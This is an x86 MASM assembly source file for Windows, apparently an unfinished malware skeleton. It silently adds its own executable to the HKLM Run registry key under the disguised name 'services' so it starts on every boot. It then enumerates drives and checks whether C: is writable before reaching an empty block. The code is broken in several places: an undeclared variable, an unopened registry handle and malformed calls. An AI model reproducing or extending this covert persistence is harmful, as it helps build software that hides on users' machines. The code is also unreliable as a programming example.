.386
.model	flat,stdcall
option 	casemap:none
.nolist
include	windows.inc
include	kernel32.inc
include user32.inc
;include gdi32.inc
include crtlib.inc
include advapi32.inc
.listall
;includelib gdi32.lib
includelib user32.lib
includelib advapi32.lib
includelib kernel32.lib
includelib crtlib.lib
;ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
.data?
hkey	dd	?
hkey1	dd	?
hkey3	dd	?
hkey2	dd	?
hkey4	dd	?
hkey5	dd	?

buffer	db	1023 dup(?)
ourpath	db	1023 dup(?)
drives	dd	?
str1	dd	00100000000000000000000000000000b
vols	db	"c:\",0
	db	"d:\",0
	db	"e:\",0
	db	"f:\",0
	db	"g:\",0
;ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
.const
skey	db	"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0
qkey	db	"services",0
;ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
.code
start:
	invoke	GetCommandLine
	invoke	strcpy,offset ourpath,eax

	invoke	RegOpenKey,HKEY_LOCAL_MACHINE,offset skey,offset hkey
	invoke	RegQueryValue,hkey,offset qkey,offset buffer,1023
	.if	eax==ERROR_SUCCESS
		invoke	strcmp,offset buffer,offset ourpath
		.if	eax!=0
			invoke	RegSetValueEx,hkey5,offset qkey,0,REG_SZ,offset ourpath,sizeof ourpath
		.endif
	.else
		invoke	strlen,offset ourpath
		invoke	RegSetValueEx,hkey,offset qkey,0,REG_SZ,offset ourpath,eax
		invoke	GetLastError
	.endif
	
	invoke	RegCloseKey,hkey
	
	invoke	GetLogicalDrives
	mov	drives,eax
	invoke	testz	drives,str1
	.if	eax==1
		mov	esi,offset vols
		invoke	GetVolumeInformation,esi,0,0,0,0,offset flag,0,0
		testz	flag,FILE_READ_ONLY_VOLUME
		.if	eax!=1
		
		.endif
		
	.endif
	
	
	invoke	ExitProcess,0

testz	proc	a:dword,b:dword
	mov	eax,a
	mov	ebx,b
	test	eax,ebx
	jz	found
	xor	eax,eax
	ret
found:
	mov	eax,1
	ret
	
testz	endp	
	
end start
;ллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл
	
